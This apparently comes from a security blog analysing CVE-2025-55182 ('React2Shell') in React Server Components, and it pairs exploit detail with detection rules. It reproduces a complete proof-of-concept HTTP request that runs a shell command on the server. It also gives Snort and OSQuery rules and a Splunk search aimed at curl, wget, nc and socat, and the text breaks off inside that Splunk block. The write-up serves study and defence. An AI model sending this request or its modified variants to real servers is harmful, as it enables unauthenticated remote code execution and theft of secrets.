<p>In this article, we take a detailed look at <strong>CVE-2025-55182</strong>, a critical vulnerability revealed in December 2025 that immediately drew attention across the security community. Classified with the maximum <strong>CVSS score of 10.0</strong>, this flaw represents a complete breakdown of trust boundaries within applications built using <strong>React Server Components (RSC)</strong>.</p>
<p>Frameworks that rely heavily on RSC—most notably <strong>Next.js</strong>—are directly exposed to this issue. The vulnerability was informally named <strong>“React2Shell”</strong> by the researchers who uncovered it, highlighting the severity of the attack path. With minimal interaction and no authentication required, a remote attacker can trigger arbitrary code execution on the server by sending a single malicious HTTP request.</p>
<p>This exploit essentially turns a feature intended for high-performance server-side rendering into a direct entry point for full system compromise, making it one of the most dangerous web vulnerabilities discovered in recent years.</p>
<hr>
<h2 id="react-server-components-and-the-react-flight-protocol"><strong>React Server Components and the React Flight Protocol</strong><a hidden class="anchor" aria-hidden="true" href="#react-server-components-and-the-react-flight-protocol">#</a></h2>
<p>To fully understand how the React2Shell vulnerability works, it’s important to grasp the fundamentals of <strong>React Server Components (RSC)</strong> and the <strong>React Flight</strong> communication protocol. RSC, introduced in <strong>React 19</strong>, shifts part of the rendering workload from the browser to the server. Instead of sending raw JavaScript to the client, the server performs the heavy computation and returns a pre-processed component tree. This design improves performance, reduces bundle sizes, and allows the client to stay lightweight.</p>
<p>To support this architecture, React relies on a low-level data exchange format known as the <strong>Flight Protocol</strong>. The Flight Protocol defines how the server serialises component output and how the client deserialises it back into a usable structure. When the browser needs the server to run a “Server Action”—a function that executes only on the server—it sends a specially encoded payload. This payload contains references and type markers that React uses to reconstruct component data.</p>
<p>React Flight uses unique markers in its serialisation format, such as:</p>
<ul>
<li><strong><code>$@</code></strong> → chunk reference</li>
<li><strong><code>$B</code></strong> → Blob reference</li>
<li><strong><code>$1:constructor:constructor</code></strong> → property path references using colon-separated accessors</li>
</ul>
<p>These markers allow React to efficiently reference modules, functions, and objects without shipping entire definitions over the network. However, this is also where the core of the vulnerability emerges.</p>
<h3 id="where-the-vulnerability-appears"><em><strong>Where the Vulnerability Appears</strong></em><a hidden class="anchor" aria-hidden="true" href="#where-the-vulnerability-appears">#</a></h3>
<p>The vulnerable versions of React Server Components <strong>fail to properly validate</strong> these incoming references. The server assumes that the client will only send legitimate references to exported modules. Instead, an attacker can craft a malicious payload containing forged serialisation markers that point to internal JavaScript properties or object constructors that should never be exposed.</p>
<p>Because the server blindly trusts these references:</p>
<ul>
<li>Arbitrary object paths can be accessed</li>
<li>Prototype chains can be polluted</li>
<li>Malicious data structures can be instantiated</li>
<li>Server-side execution can be redirected to attacker-controlled values</li>
</ul>
<p>This behaviour allows hostile clients to forge a payload that React treats as valid—ultimately enabling prototype pollution and, in affected frameworks such as <strong>Next.js</strong>, full remote code execution.</p>
<h3 id="why-this-vulnerability-is-so-dangerous"><em><strong>Why This Vulnerability Is So Dangerous</strong></em><a hidden class="anchor" aria-hidden="true" href="#why-this-vulnerability-is-so-dangerous">#</a></h3>
<p>Several factors contribute to the severity of React2Shell (CVE-2025-55182):</p>
<ul>
<li><strong>Vulnerable by default</strong> — no misconfiguration or custom code is required</li>
<li><strong>Single-request exploitation</strong> — only one HTTP request is needed</li>
<li><strong>Pre-authentication attack</strong> — the attacker doesn’t need to log in</li>
<li><strong>Highly reliable PoCs</strong> — exploit scripts work consistently</li>
<li><strong>Affects the entire RSC ecosystem</strong> — including popular frameworks like Next.js</li>
</ul>
<p>Because React Server Components sit at the core of server-side rendering in modern React apps, compromising them effectively gives an attacker direct access to backend execution paths.</p>
<hr>
<h2 id="insecure-deserialization-and-how-it-affects-react-server-components"><strong>Insecure Deserialization and How It Affects React Server Components</strong><a hidden class="anchor" aria-hidden="true" href="#insecure-deserialization-and-how-it-affects-react-server-components">#</a></h2>
<p>At the heart of the React2Shell vulnerability lies a classic security flaw: <strong>Insecure Deserialization</strong>. In typical server-side applications, deserialization occurs when structured data—JSON, binary formats, or custom protocols—is converted back into in-memory objects. If this process does not include strict validation, attackers can craft malicious payloads that the system interprets as trusted data, potentially leading to code execution, data manipulation, or full system compromise.</p>
<p>React Server Components (RSC) introduce a unique form of deserialization through the <strong>Flight Protocol</strong>, which interprets special markers and data structures to reconstruct server-side resources requested by the client. This makes RSC heavily reliant on safe deserialization practices. Unfortunately, CVE-2025-55182 exposes how fragile this mechanism can be when not validated properly.</p>
<h3 id="how-deserialization-works-in-rsc"><em><strong>How Deserialization Works in RSC</strong></em><a hidden class="anchor" aria-hidden="true" href="#how-deserialization-works-in-rsc">#</a></h3>
<p>CVE-2025-55182 is fundamentally an <strong>Insecure deserialization vulnerability</strong> in how React Server Components handle incoming Flight protocol payloads. The vulnerability exists in the <code>requireModule</code> function within the <code>react-server-dom-webpack</code> package. Let’s examine the problematic code pattern:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">requireModule</span><span class="p">(</span><span class="nx">metadata</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="kd">var</span> <span class="nx">moduleExports</span> <span class="o">=</span> <span class="nx">__webpack_require__</span><span class="p">(</span><span class="nx">metadata</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"> <span class="c1">// ... additional logic ...
</span></span></span><span class="line"><span class="cl"> <span class="k">return</span> <span class="nx">moduleExports</span><span class="p">[</span><span class="nx">metadata</span><span class="p">[</span><span class="mi">2</span><span class="p">]];</span>  <span class="c1">// VULNERABLE LINE
</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The critical flaw is in the bracket notation access <code>moduleExports[metadata[2]]</code>. In JavaScript, when we access a property using bracket notation, the engine doesn’t just check the object’s own properties—it traverses the entire prototype chain. This means an attacker can reference properties that weren’t explicitly exported by the module.</p>
<p>Most importantly, every JavaScript function has a <code>constructor</code> property that points to the <code>Function</code> constructor. By accessing <code>someFunction.constructor</code>, an attacker obtains a reference to the global <code>Function</code> constructor, which can execute arbitrary JavaScript code when invoked with a string argument.</p>
<p>The vulnerability becomes exploitable because React’s Flight protocol allows clients to specify these property paths through the colon-separated reference syntax. An attacker can craft a reference like <code>$1:constructor:constructor</code> which traverses:</p>
<ol>
<li>Get chunk/module 1</li>
<li>Access its <code>.constructor</code> property (gets the Function constructor)</li>
<li>Access <code>.constructor</code> again (still the Function constructor, but confirms the chain).</li>
</ol>
<hr>
<h2 id="affected-versions--components"><strong>Affected Versions &amp; Components</strong><a hidden class="anchor" aria-hidden="true" href="#affected-versions--components">#</a></h2>
<p>The vulnerability is present in versions 19.0, 19.1.0, 19.1.1, and 19.2.0 of:</p>
<ul>
<li><a href="https://www.npmjs.com/package/react-server-dom-webpack">react-server-dom-webpack</a></li>
<li><a href="https://www.npmjs.com/package/react-server-dom-parcel">react-server-dom-parcel</a></li>
<li><a href="https://www.npmjs.com/package/react-server-dom-turbopack?activeTab=readme">react-server-dom-turbopack</a></li>
</ul>
<p>Some React frameworks and bundlers depended on, had peer dependencies for, or included the vulnerable React packages. The following React frameworks &amp; bundlers are affected: <a href="https://www.npmjs.com/package/next">next</a>, <a href="https://www.npmjs.com/package/react-router">react-router</a>, <a href="https://www.npmjs.com/package/waku">waku</a>, <a href="https://www.npmjs.com/package/@parcel/rsc">@parcel/rsc</a>, <a href="https://www.npmjs.com/package/@vitejs/plugin-rsc">@vitejs/plugin-rsc</a>, and <a href="https://www.npmjs.com/package/rwsdk">rwsdk</a>.</p>
<p>See the <a href="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components#update-instructions">update instructions</a> for how to upgrade to these patches.</p>
<hr>
<h2 id="attack-surface-mapping"><strong>Attack Surface Mapping</strong><a hidden class="anchor" aria-hidden="true" href="#attack-surface-mapping">#</a></h2>
<p>To exploit CVE-2025-55182, an attacker sends a crafted input to a web application running React Server Components functions in the form of a POST request. This input is then processed as a serialized object and passed to the backend server, where it is deserialized. Due to the default trust among the components, the attacker-provided input is then deserialized and the backend runs attacker-provided code under the NodeJS runtime.</p>
<p>![[Pasted image 20260109133545.png]]</p>
<p>Post-exploitation, attackers were observed to run arbitrary commands, such as reverse shells to known Cobalt Strike servers. To achieve persistence, attackers added new malicious users, utilized remote monitoring and management (RMM) tools such as MeshAgent, modified <em>authorized_keys</em> file, and enabled root login. To evade security defenses, the attackers downloaded from attacker-controlled CloudFlare Tunnel endpoints (for example, *<em>.trycloudflare.com</em>) and used <a href="https://attack.mitre.org/techniques/T1564/013/">bind mounts</a> to hide malicious processes and artifacts from system monitoring tools.</p>
<p>The malware payloads seen in campaigns investigated by Microsoft Defender vary from remote access trojans (RATs) like VShell and EtherRAT, the SNOWLIGHT memory-based malware downloader that enabled attackers to deploy more payloads to target environments, ShadowPAD, and XMRig cryptominers. The attacks proceeded by enumerating system details and environment variables to enable lateral movement and credential theft.</p>
<p>Credentials that were observed to be targeted included Azure Instance Metadata Service (IMDS) endpoints for Azure, Amazon Web Services (AWS), Google Cloud Platform (GCP), and Tencent Cloud to acquire identity tokens, which could be used to move laterally to other cloud resources. Attackers also deployed secret discovery tools such as TruffleHog and Gitleaks, along with custom scripts to extract several different secrets. Attempts to harvest AI and cloud-native credentials, such as OpenAI API keys, Databricks tokens, and Kubernetes service‑account credentials were also observed. Azure Command-Line Interface (CLI) (az) and Azure Developer CLI (azd) were also used to obtain tokens.</p>
<hr>
<h2 id="proof-of-concept-poc-breakdown"><strong>Proof of Concept (PoC) Breakdown</strong><a hidden class="anchor" aria-hidden="true" href="#proof-of-concept-poc-breakdown">#</a></h2>
<p>Now let’s dissect how <a href="https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http">maple3142’s proof-of-concept</a> achieves remote code execution. The exploit cleverly chains together multiple JavaScript engine behaviours to transform a deserialization bug into arbitrary code execution.</p>
<p><strong>Stage 1: Creating a Fake Chunk Object</strong></p>
<p>The exploit begins by sending a multipart form request with three fields. The first field contains a carefully crafted fake chunk object:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&#34;then&#34;</span><span class="p">:</span> <span class="s2">&#34;$1:__proto__:then&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&#34;status&#34;</span><span class="p">:</span> <span class="s2">&#34;resolved_model&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&#34;reason&#34;</span><span class="p">:</span> <span class="mi">-1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&#34;value&#34;</span><span class="p">:</span> <span class="s2">&#34;{\\\\&#34;</span><span class="err">then\\\\</span><span class="s2">&#34;:\\\\&#34;</span><span class="err">$B</span><span class="mi">1337</span><span class="err">\\\\</span><span class="s2">&#34;}&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"> <span class="nt">&#34;_response&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;_prefix&#34;</span><span class="p">:</span> <span class="s2">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;xcalc&#39;);&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;_chunks&#34;</span><span class="p">:</span> <span class="s2">&#34;$Q2&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">   <span class="nt">&#34;_formData&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="nt">&#34;get&#34;</span><span class="p">:</span> <span class="s2">&#34;$1:constructor:constructor&#34;</span>
</span></span><span class="line"><span class="cl">   <span class="p">}</span>
</span></span><span class="line"><span class="cl"> <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This object mimics React’s internal <code>Chunk</code> class structure. By setting <code>then</code> to reference <code>Chunk.prototype.then</code>, we’re creating a self-referential structure. When React processes this and awaits the chunk, it invokes the <code>then</code> method with the fake chunk as the context (<code>this</code>).</p>
<p><strong>Stage 2: Exploiting the Blob Deserialization Handler</strong></p>
<p>The second critical component is the <code>$B</code> handler reference (<code>$B1337</code>). In React’s Flight protocol, the <code>$B</code> prefix indicates a Blob reference. When React processes a Blob reference, it calls a function that internally uses <code>response._formData.get(response._prefix + id)</code>.</p>
<p>Here’s where the exploitation becomes elegant: we’ve polluted the <code>_response</code> object with our malicious properties. When the Blob handler executes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">response</span><span class="p">.</span><span class="nx">_formData</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">_prefix</span> <span class="o">+</span> <span class="nx">id</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It actually executes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nb">Function</span><span class="p">(</span><span class="s2">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;xcalc&#39;);1337&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let’s break down why: we’ve set <code>_formData.get</code> to point to <code>$1:constructor:constructor</code>, which resolves to the <code>Function</code> constructor. The <code>_prefix</code> contains our malicious code. When these are combined, the <code>Function</code> constructor is invoked with our code as a string argument, creating and implicitly executing a function containing our arbitrary JavaScript.</p>
<p><strong>Stage 3: Achieving Code Execution</strong></p>
<p>The payload <code>process.mainModule.require('child_process').execSync('xcalc')</code> demonstrates the power of this exploit. We’re using Node.js’s module system to:</p>
<ol>
<li>Access <code>process.mainModule</code> (the main module being executed)</li>
<li>Use its <code>require</code> method to load the <code>child_process</code> module</li>
<li>Call <code>execSync</code> to execute an operating system command</li>
<li>In this case, launching the calculator application (<code>xcalc</code>) as proof of exploitation</li>
</ol>
<p>This could easily be modified to establish a reverse shell, exfiltrate environment variables containing secrets, read sensitive files, or perform any operation the Node.js process has permissions to execute.</p>
<p>Let’s examine the complete HTTP request from maple3142’s PoC:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">POST</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="p">:</span> <span class="n">localhost</span>
</span></span><span class="line"><span class="cl"><span class="n">Next</span><span class="o">-</span><span class="n">Action</span><span class="p">:</span> <span class="n">x</span>
</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">boundary</span><span class="o">=----</span><span class="n">WebKitFormBoundaryx8jO2oVc6SWP3Sad</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryx8jO2oVc6SWP3Sad</span>
</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;0&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;then&#34;</span><span class="p">:</span><span class="s2">&#34;$1:__proto__:then&#34;</span><span class="p">,</span><span class="s2">&#34;status&#34;</span><span class="p">:</span><span class="s2">&#34;resolved_model&#34;</span><span class="p">,</span><span class="s2">&#34;reason&#34;</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span><span class="s2">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;{</span><span class="se">\\\\</span><span class="s2">&#34;</span><span class="n">then</span>\\\\<span class="s2">&#34;:</span><span class="se">\\\\</span><span class="s2">&#34;</span><span class="o">$</span><span class="n">B1337</span>\\\\<span class="s2">&#34;}&#34;</span><span class="p">,</span><span class="s2">&#34;_response&#34;</span><span class="p">:{</span><span class="s2">&#34;_prefix&#34;</span><span class="p">:</span><span class="s2">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;xcalc&#39;);&#34;</span><span class="p">,</span><span class="s2">&#34;_chunks&#34;</span><span class="p">:</span><span class="s2">&#34;$Q2&#34;</span><span class="p">,</span><span class="s2">&#34;_formData&#34;</span><span class="p">:{</span><span class="s2">&#34;get&#34;</span><span class="p">:</span><span class="s2">&#34;$1:constructor:constructor&#34;</span><span class="p">}}}</span>
</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryx8jO2oVc6SWP3Sad</span>
</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;1&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;$@0&#34;</span>
</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryx8jO2oVc6SWP3Sad</span>
</span></span><span class="line"><span class="cl"><span class="n">Content</span><span class="o">-</span><span class="n">Disposition</span><span class="p">:</span> <span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="p">;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&#34;2&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">[]</span>
</span></span><span class="line"><span class="cl"><span class="o">------</span><span class="n">WebKitFormBoundaryx8jO2oVc6SWP3Sad</span><span class="o">--</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>Next-Action: x</code> header triggers React’s Server Action processing. The multipart body contains three parts:</p>
<ul>
<li><strong>Field 0</strong>: The fake chunk object with our malicious <code>_response</code> structure</li>
<li><strong>Field 1</strong>: A reference <code>$@0</code> that points back to field 0, creating the self-reference</li>
<li><strong>Field 2</strong>: An empty array, completing the required structure</li>
</ul>
<p>When the server processes this request, it deserialises field 0, encounters the $@0 reference in field 1, establishes the self-referential then property, and subsequently triggers the Blob handler, which executes our code through the <code>Function</code> constructor.</p>
<hr>
<h2 id="detection--monitoring"><strong>Detection &amp; Monitoring</strong><a hidden class="anchor" aria-hidden="true" href="#detection--monitoring">#</a></h2>
<p>This portion of the blog will provide various detection mechanisms for recognizing React2Shell within your network and environment.</p>
<p>Fortunately for us defenders, this specific vulnerability requires interacting within React &amp; React Server Components (RCS) within a specific format and structure. Regular user browsing activity will not have specific headers and values within their HTTP(S) request that is required for exploiting this vulnerability.</p>
<p>For example, the Next-Action and multipart/form-data are an incredibly specific query and payload for the React Server Component Flight protocol. We will almost never see a regular/legitimate user providing this within their query, and the payload for the vulnerability must have certain elements:</p>
<ul>
<li>Next-Action <code>header</code>.</li>
<li><code>multipart/form-data</code>.</li>
<li>Elements within form-data with elements such as <code>&quot;status&quot;: &quot;reserved_model&quot;</code> within the payload.</li>
<li>For reference, detecting the presence of <code>&quot;then&quot;:&quot;$1:__proto__:then&quot;</code> within the payload is an extremely good indicator that React Server Components are being used. This should almost never be seen externally, but rather, within the application itself at a push.</li>
</ul>
<p>Due to how exploitation of this vulnerability works, we can expect a certain pattern within the HTTP(S) request. Therefore, for monitoring and detection, rather than specifically inspecting the payload, we can rather monitor the format of the request.</p>
<h3 id="snort-v3"><em><strong>Snort (v3)</strong></em><a hidden class="anchor" aria-hidden="true" href="#snort-v3">#</a></h3>
<p>To detect this vulnerability using Snort, we can use the following rule:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">alert http any any -&gt; <span class="nv">$LAN_NETWORK</span> any <span class="o">(</span>
</span></span><span class="line"><span class="cl">    msg:<span class="s2">&#34;Potential Next.js React2Shell / CVE-2025-66478 attempt&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    flow:to_server,established<span class="p">;</span>
</span></span><span class="line"><span class="cl">    content:<span class="s2">&#34;Next-Action&#34;</span><span class="p">;</span> http_header<span class="p">;</span> nocase<span class="p">;</span>
</span></span><span class="line"><span class="cl">    content:<span class="s2">&#34;multipart/form-data&#34;</span><span class="p">;</span> http_header<span class="p">;</span> nocase<span class="p">;</span>
</span></span><span class="line"><span class="cl">    pcre:<span class="s2">&#34;/Content-Disposition:\\s*form-data;\\s*name=\\&#34;</span>0<span class="se">\\</span><span class="s2">&#34;/s&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    pcre:<span class="s2">&#34;/\\&#34;</span>status<span class="se">\\</span><span class="s2">&#34;\\s*:\\s*\\&#34;</span>resolved_model<span class="se">\\</span><span class="s2">&#34;/s&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    pcre:<span class="s2">&#34;/\\&#34;</span><span class="k">then</span><span class="se">\\</span><span class="s2">&#34;\\s*:\\s*\\&#34;</span><span class="se">\\</span><span class="nv">$1</span>:__proto__:then<span class="se">\\</span><span class="s2">&#34;/s&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    classtype:web-application-attack
</span></span><span class="line"><span class="cl">    sid:6655001<span class="p">;</span>
</span></span><span class="line"><span class="cl">    rev:1<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>At a summary, this snort rule:</p>
<ul>
<li>Listens for specific headers within the request, that aren&rsquo;t usually generated by regular user traffic.</li>
<li>Detects multipart/form-data where RSCs do not regularly use. Payloads for this vulnerability need to follow a certain specification for the exploit to be processed - we can detect this. For example, the <code>name=&quot;0&quot;</code> element.</li>
</ul>
<h3 id="osquery"><em><strong>OSQuery</strong></em><a hidden class="anchor" aria-hidden="true" href="#osquery">#</a></h3>
<p>We can use the following OSQuery rule to detect vulnerable versions of React Server Components within an endpoint or anything within the CI/CD build process:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&#34;queries&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&#34;detect_rev2shell_react_server_components&#34;</span><span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;query&#34;</span><span class="p">:</span> <span class="s2">&#34;SELECT name, version, path FROM npm_packages WHERE (name=&#39;react-server-dom-parcel&#39; AND (version=&#39;19.0.0&#39; OR (version &gt;= &#39;19.1.0&#39; AND version &lt; &#39;19.1.2&#39;) OR version=&#39;19.2.0&#39;)) OR (name=&#39;react-server-dom-turbopack&#39; AND (version=&#39;19.0.0&#39; OR (version &gt;= &#39;19.1.0&#39; AND version &lt; &#39;19.1.2&#39;) OR version=&#39;19.2.0&#39;)) OR (name=&#39;react-server-dom-webpack&#39; AND (version=&#39;19.0.0&#39; OR (version &gt;= &#39;19.1.0&#39; AND version &lt; &#39;19.1.2&#39;) OR version=&#39;19.2.0&#39;));&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;interval&#34;</span><span class="p">:</span> <span class="mi">3600</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;description&#34;</span><span class="p">:</span> <span class="s2">&#34;Detects vulnerable versions of React Server Components packages (react-server-dom-*) affected by CVE-2025-55182 / CVE-2025-66478 / React2Shell.&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;platform&#34;</span><span class="p">:</span> <span class="s2">&#34;linux,windows,macos&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="s2">&#34;1.0&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>At a summary, this OSQuery rule:</p>
<ul>
<li>Detects if vulnerable packages are used within an endpoint: react-server-dom-parcel, react-server-dom-turbopack, react-server-dom-webpack.</li>
<li>If present, checks the installed versions of these packages compared to vulnerable versions (I.e. 19.0.0, &gt;= 19.1.0 / 19.2.0).</li>
</ul>
<p>The benefit of this OSQuery rule is that we can search and determine for vulnerable versions across endpoints, rather hosted, or as part of the build or development process, before it even reaches production.</p>
<h3 id="splunk"><em><strong>Splunk</strong></em><a hidden class="anchor" aria-hidden="true" href="#splunk">#</a></h3>
<p>This Splunk query identifies suspicious child processes spawned from Node.js or Next.js processes—such as server components or development servers—to detect possible React2Shell exploitation. It looks for high-risk binaries (curl, wget, bash, python, nc, socat, etc.) or shell-like behavior executed by Node-based processes, which would indicate an attacker has achieved remote code execution. The search correlates process activity, timestamps, parent/child relationships, and command patterns to highlight anomalous or malicious behavior originating from React Server Component workflows.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
